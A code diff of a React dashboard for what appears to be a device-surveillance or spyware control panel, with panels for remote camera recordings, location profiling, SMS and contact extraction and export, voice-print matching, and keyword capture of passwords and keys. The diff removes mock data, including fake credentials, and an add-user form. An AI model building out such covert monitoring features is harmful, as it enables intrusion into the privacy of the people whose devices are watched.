-                { id:"cr1", dev:"EXEC-LAPTOP-01",  cam:"Front Camera",  trigger:"motion",    dur:"0:42", size:"28 MB",  ts:"14:31:00", flagged:true,  thumb:"👤" },
-                { id:"cr2", dev:"iPhone-15-Pro",   cam:"Front Camera",  trigger:"scheduled", dur:"5:00", size:"180 MB", ts:"14:30:00", flagged:false, thumb:"🌆" },
-                { id:"cr3", dev:"Galaxy-S24-Ultra",cam:"Rear Camera",   trigger:"manual",    dur:"2:15", size:"96 MB",  ts:"14:25:00", flagged:false, thumb:"🏙" },
-                { id:"cr4", dev:"MacBook-Pro-M3",  cam:"FaceTime HD",   trigger:"motion",    dur:"1:08", size:"41 MB",  ts:"14:20:00", flagged:true,  thumb:"👥" },
-                { id:"cr5", dev:"Mate60-Pro",       cam:"Rear 50MP",    trigger:"scheduled", dur:"10:00",size:"620 MB", ts:"14:00:00", flagged:false, thumb:"🌃" },
-                { id:"cr6", dev:"KIOSK-UBUNTU-07", cam:"USB Webcam",    trigger:"motion",    dur:"0:15", size:"8 MB",   ts:"13:55:00", flagged:true,  thumb:"🚨" },
-              ];
+              const CAM_RECS = [];
               const visible = camRecFilter === "all" ? CAM_RECS
                 : camRecFilter === "flagged" ? CAM_RECS.filter(r=>r.flagged)
                 : CAM_RECS.filter(r=>r.trigger===camRecFilter);
@@ -2005,13 +1777,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
             <Chip color="#10b981">AI ACTIVE</Chip>
           </div>
           <div className="p-5 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-            {[
-              { dev:"EXEC-LAPTOP-01",  pattern:"Stationary — Office",       risk:"low",    insight:"Daily routine normal. Always at 40.71°N on weekdays.",          anomaly:false },
-              { dev:"Galaxy-S24-Ultra",pattern:"High-Speed Movement",       risk:"high",   insight:"42 km/h movement detected — possible vehicle. Route deviates.",  anomaly:true  },
-              { dev:"iPhone-15-Pro",   pattern:"Stationary — Residential",  risk:"low",    insight:"Home location 19.07°N. Movement matches commute baseline.",      anomaly:false },
-              { dev:"MacBook-Pro-M3",  pattern:"Office — Singapore CBD",    risk:"low",    insight:"Static in Singapore HQ. Last exit: Yesterday 18:30.",            anomaly:false },
-              { dev:"Mate60-Pro",      pattern:"Urban Movement",            risk:"medium", insight:"Moving through Shanghai Pudong. Unusual late-night activity.",    anomaly:true  },
-            ].map((m,i) => (
+            {[].map((m,i) => (
               <div key={i} className="p-4 rounded-xl border" style={{ background:"#0d1930", borderColor: m.anomaly?"rgba(239,68,68,0.3)":"rgba(16,185,129,0.15)" }}>
                 <div className="flex items-center gap-2 mb-2">
                   <Chip color={m.risk==="high"?"#ef4444":m.risk==="medium"?"#f59e0b":"#10b981"}>{m.risk}</Chip>
@@ -2199,7 +1965,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
         const job = viewJobId ? extractJobs.find(j => j.id === viewJobId) : null;
         const typeLabel = job?.type ?? viewQuickType ?? "";
         const devLabel  = job?.dev  ?? quickExtractDev;
-        const devData   = DEVICE_EXTRACT_DATA[devLabel] ?? DEVICE_EXTRACT_DATA["iPhone-15-Pro"];
+        const devData   = DEVICE_EXTRACT_DATA[devLabel] ?? DEVICE_EXTRACT_DATA["iPhone-15-Pro"] ?? {};
         const sample    = devData[typeLabel] ?? devData[Object.keys(devData)[0]] ?? { cols:["Data"], rows:[["No data available"]] };
         const osColor   = devLabel.includes("iPhone")||devLabel.includes("Mac") ? "#10d9a0"
                         : devLabel.includes("Galaxy")||devLabel.includes("Pixel") ? "#10b981"
@@ -2288,13 +2054,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
               <ActionBtn onClick={() => show("SMS log exported (sms_dump.csv)","info")} color="#3b82f6" outline><Download size={11}/>Export</ActionBtn>
             </div>
             <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
-              {[
-                { from:"+1-555-0142", to:"Galaxy-S24-Ultra", msg:"Meeting at 3pm — bring the documents",        ts:"14:28" },
-                { from:"Galaxy-S24-Ultra", to:"+1-555-0198", msg:"Ok confirmed. Transfer done.",                ts:"14:27" },
-                { from:"+44-7700-900142", to:"iPhone-15-Pro", msg:"Hi Raj, password for portal is Raj2024!", ts:"14:20" },
-                { from:"iPhone-15-Pro",   to:"+91-98201-xxxxx",msg:"Got it. Will login now",                   ts:"14:21" },
-                { from:"+86-139-xxxx",    to:"Mate60-Pro",    msg:"文件已发送 (Files sent)",                    ts:"14:15" },
-              ].map((s,i) => (
+              {[].map((s,i) => (
                 <div key={i} className="px-4 py-3 hover:bg-purple-500/5 transition-colors">
                   <div className="flex items-center gap-2 mb-1 text-[10px] font-mono">
                     <span style={{ color:"#10d9a0" }}>{s.from}</span>
@@ -2315,13 +2075,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
               <ActionBtn onClick={() => show("Contacts exported (contacts.vcf)","info")} color="#10b981" outline><Download size={11}/>Export vCard</ActionBtn>
             </div>
             <div className="divide-y" style={{ borderColor:"rgba(59,130,246,0.08)" }}>
-              {[
-                { name:"Sarah Mitchell",   phone:"+1-555-0198", email:"s.mitchell@corp.io",  dev:"EXEC-LAPTOP-01" },
-                { name:"Dr. Ahmed Hassan", phone:"+44-7700-9001",email:"a.hassan@gov.uk",    dev:"iPhone-15-Pro"  },
-                { name:"李明 (Li Ming)",   phone:"+86-139-0001", email:"li.ming@cn-corp.com", dev:"Mate60-Pro"     },
-                { name:"Dmitri Volkov",    phone:"+7-916-5559",  email:"d.volkov@fsb.ru",    dev:"DEVBOX-ARCH"    },
-                { name:"CEO — Board Line", phone:"+1-555-0001",  email:"ceo@headquarters.io", dev:"EXEC-LAPTOP-01"},
-              ].map((ct,i) => (
+              {([] as {name:string;phone:string;email:string;dev:string}[]).map((ct,i) => (
                 <div key={i} className="flex items-center gap-3 px-4 py-3 hover:bg-green-500/5 transition-colors">
                   <div className="w-9 h-9 rounded-full flex items-center justify-center text-sm font-black flex-shrink-0" style={{ background:"rgba(16,185,129,0.15)", color:"#10b981" }}>
                     {ct.name.charAt(0)}
@@ -2686,12 +2440,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
                 <ActionBtn onClick={() => show("Voice model retrained")} color="#10b981" outline><RefreshCw size={11}/>Retrain</ActionBtn>
               </div>
               <div className="p-4 space-y-3">
-                {[
-                  {name:"James Morgan",conf:"99.1%",last:"14:32",dev:"EXEC-LAPTOP-01",status:"matched"},
-                  {name:"Sofia Chen",  conf:"97.8%",last:"14:28",dev:"MacBook-Pro-M3", status:"matched"},
-                  {name:"UNKNOWN",     conf:"—",    last:"14:25",dev:"Galaxy-S24-Ultra",status:"alert"},
-                  {name:"Lei Wei",     conf:"98.4%",last:"14:20",dev:"Mate60-Pro",     status:"matched"},
-                ].map((v,i) => (
+                {([] as {name:string;conf:string;last:string;dev:string;status:string}[]).map((v,i) => (
                   <div key={i} className="flex items-center gap-3 px-3 py-2 rounded-xl border" style={{background:"#0d1930",borderColor:v.status==="alert"?"rgba(239,68,68,0.3)":"rgba(16,185,129,0.15)"}}>
                     <div className="w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm" style={{background:`rgba(${v.status==="alert"?"239,68,68":"16,185,129"},0.15)`,color:v.status==="alert"?"#ef4444":"#10b981"}}>
                       {v.status==="alert"?"?":v.name.charAt(0)}
@@ -2838,12 +2587,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
                 <button className="px-2 py-0.5 rounded text-[10px] font-mono" style={{ background:"rgba(16,185,129,0.12)", color:"#10b981", border:"1px solid rgba(16,185,129,0.25)" }}>+ Add</button>
               </div>
               <div className="text-[10px] font-mono uppercase tracking-widest mb-2" style={{ color:"#6b8ab0" }}>Recent Matches</div>
-              {[
-                { ts:"14:31:58", dev:"MacBook-Pro-M3",   kw:"secret",     ctx:"...the secret API key is sk-ant...", risk:"high"   },
-                { ts:"14:30:44", dev:"EXEC-LAPTOP-01",  kw:"acquisition", ctx:"...the acquisition deal closes...",  risk:"medium" },
-                { ts:"14:29:12", dev:"KIOSK-UBUNTU-07", kw:"password",    ctx:"...new password: P@ssw0rd123...",    risk:"critical"},
-                { ts:"14:28:00", dev:"iPhone-15-Pro",   kw:"bitcoin",     ctx:"...send 0.5 BTC to wallet...",       risk:"high"   },
-              ].map((m,i) => (
+              {([] as {ts:string;dev:string;kw:string;ctx:string;risk:string}[]).map((m,i) => (
                 <div key={i} className="px-3 py-2 rounded-xl border" style={{ background:"#0d1930", borderColor:`${m.risk==="critical"?"rgba(239,68,68,0.3)":m.risk==="high"?"rgba(245,158,11,0.3)":"rgba(59,130,246,0.2)"}` }}>
                   <div className="flex items-center gap-2 mb-1">
                     <span className="text-[9px] font-mono" style={{ color:"#6b8ab0" }}>{m.ts}</span>
@@ -2865,12 +2609,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
             </div>
             <div className="p-4 space-y-3">
               <div className="text-[10px] font-mono uppercase tracking-widest mb-2" style={{ color:"#6b8ab0" }}>Enrolled Voice Prints</div>
-              {[
-                { name:"James Morgan",  conf:"99.1%", last:"14:32:00", dev:"EXEC-LAPTOP-01",  status:"matched" },
-                { name:"Sofia Chen",    conf:"97.8%", last:"14:28:00", dev:"MacBook-Pro-M3",   status:"matched" },
-                { name:"UNKNOWN VOICE", conf:"—",     last:"14:25:00", dev:"Galaxy-S24-Ultra", status:"alert"   },
-                { name:"Lei Wei",       conf:"98.4%", last:"14:20:00", dev:"Mate60-Pro",       status:"matched" },
-              ].map((v,i) => (
+              {([] as {name:string;conf:string;last:string;dev:string;status:string}[]).map((v,i) => (
                 <div key={i} className="flex items-center gap-3 px-3 py-2.5 rounded-xl border" style={{ background:"#0d1930", borderColor: v.status==="alert"?"rgba(239,68,68,0.3)":"rgba(16,185,129,0.15)" }}>
                   <div className="w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 text-sm font-black" style={{ background:`rgba(${v.status==="alert"?"239,68,68":"16,185,129"},0.15)`, color: v.status==="alert"?"#ef4444":"#10b981" }}>
                     {v.status==="alert"?"?":v.name.charAt(0)}
@@ -3523,7 +3262,7 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
           <div className="grid grid-cols-2 gap-3">
             <FLabel label="Status">
               <FSelect value={mStatus} onChange={v => setMStatus(v as DeviceStatus)} options={[
-                {val:"online",label:"Online"},{val:"offline",label:"Offline"},{val:"warning",label:"Warning"},
+                {val:"online",label:"Online"},{val:"offline",label:"Offline"},{val:"warning",label:"Warning"},{val:"suspended",label:"Suspended"},
               ]}/>
             </FLabel>
             <FLabel label="Health">
@@ -3565,24 +3304,6 @@ export function AdminDashboard({ onControl }: { onControl: (d: DashDevice) => vo
         </div>
       </Modal>
 
-      {/* ══ ADD USER MODAL ══ */}
-      <Modal open={showAddUser} onClose={() => setShowAddUser(false)} title="Add New User">
-        <div className="space-y-4">
-          <FLabel label="Full Name"><FInput value={uName} onChange={setUName} placeholder="e.g. Jane Smith"/></FLabel>
-          <FLabel label="Email Address"><FInput value={uEmail} onChange={setUEmail} placeholder="jane@corp.io"/></FLabel>
-          <FLabel label="Role">
-            <FSelect value={uRole} onChange={v => setURole(v as AppUser["role"])} options={[
-              {val:"admin",    label:"Admin — full access"},
-              {val:"operator", label:"Operator — manage devices"},
-              {val:"viewer",   label:"Viewer — read only"},
-            ]}/>
-          </FLabel>
-          <div className="flex justify-end gap-3 pt-2 border-t" style={{ borderColor:"rgba(59,130,246,0.15)" }}>
-            <ActionBtn onClick={() => setShowAddUser(false)} color="#6b8ab0" outline>Cancel</ActionBtn>
-            <ActionBtn onClick={handleAddUser} color="#3b82f6"><User size={13}/>Add User</ActionBtn>
-          </div>
-        </div>
-      </Modal>
 
       {/* ══ QR MODAL ══ */}
       {showQR && <AdminQRModal onClose={() => setShowQR(false)} show={show} />}
